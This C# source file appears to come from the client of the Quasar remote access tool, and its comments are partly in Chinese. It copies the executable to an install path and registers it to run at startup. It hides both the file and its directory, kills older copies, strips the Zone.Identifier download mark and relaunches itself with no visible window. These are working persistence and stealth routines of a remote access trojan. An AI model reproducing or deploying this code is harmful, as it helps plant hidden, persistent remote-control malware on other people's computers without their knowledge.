using Quasar.Client.Config;
using Quasar.Client.Extensions;
using Quasar.Common.Helpers;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace Quasar.Client.Setup
{
    public class ClientInstaller : ClientSetupBase
    {
        public void ApplySettings()
        {
            if (Settings.STARTUP)
            {
                var clientStartup = new ClientStartup();
                clientStartup.AddToStartup(Application.ExecutablePath, Settings.STARTUPKEY);
            }

            if (Settings.INSTALL && Settings.HIDEFILE)
            {
                try
                {
                    File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden);
                }
                catch (Exception ex)
                {
                    Debug.WriteLine(ex);
                }
            }

            if (Settings.INSTALL && Settings.HIDEINSTALLSUBDIRECTORY && !string.IsNullOrEmpty(Settings.SUBDIRECTORY))
            {
                try
                {
                    DirectoryInfo di = new DirectoryInfo(Path.GetDirectoryName(Settings.INSTALLPATH));
                    di.Attributes |= FileAttributes.Hidden;
                }
                catch (Exception ex)
                {
                    Debug.WriteLine(ex);
                }
            }
        }

        public void Install()
        {
            // 创建目标目录
            if (!Directory.Exists(Path.GetDirectoryName(Settings.INSTALLPATH)))
            {
                Directory.CreateDirectory(Path.GetDirectoryName(Settings.INSTALLPATH));
            }

            // 删除现有文件
            if (File.Exists(Settings.INSTALLPATH))
            {
                try
                {
                    File.Delete(Settings.INSTALLPATH);
                }
                catch (Exception ex)
                {
                    if (ex is IOException || ex is UnauthorizedAccessException)
                    {
                        // 杀死运行在目标路径的旧进程
                        Process[] foundProcesses =
                            Process.GetProcessesByName(Path.GetFileNameWithoutExtension(Settings.INSTALLPATH));
                        int myPid = Process.GetCurrentProcess().Id;
                        foreach (var prc in foundProcesses)
                        {
                            // 不要杀死自己的进程
                            if (prc.Id == myPid) continue;
                            // 只杀死目标路径上的进程
                            if (prc.GetMainModuleFileName() != Settings.INSTALLPATH) continue;
                            prc.Kill();
                            Thread.Sleep(2000);
                            break;
                        }
                    }
                }
            }

            File.Copy(Application.ExecutablePath, Settings.INSTALLPATH, true);

            ApplySettings();

            FileHelper.DeleteZoneIdentifier(Settings.INSTALLPATH);

            //启动文件
            var startInfo = new ProcessStartInfo
            {
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                UseShellExecute = false,
                FileName = Settings.INSTALLPATH
            };
            Process.Start(startInfo);
        }
    }
}
